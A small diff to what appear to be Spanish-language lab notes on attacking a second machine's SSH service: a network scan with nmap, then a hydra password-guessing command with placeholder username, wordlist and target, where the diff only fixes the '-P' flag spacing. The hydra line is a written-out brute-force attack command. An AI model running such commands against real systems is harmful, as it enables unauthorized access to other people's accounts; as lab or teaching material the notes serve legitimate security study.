@@ -3,7 +3,7 @@
 
 ++ PC2: ifconfig
 ++ PC1: nmap <ip_PC2>
-++ PC1: hydra -l <username> - P <worldlist> <ip_PC2> ssh -vV
+++ PC1: hydra -l <username> -P <worldlist> <ip_PC2> ssh -vV
 ++ PC1: Esperar si el proceso es satisfactorio o no
 
 
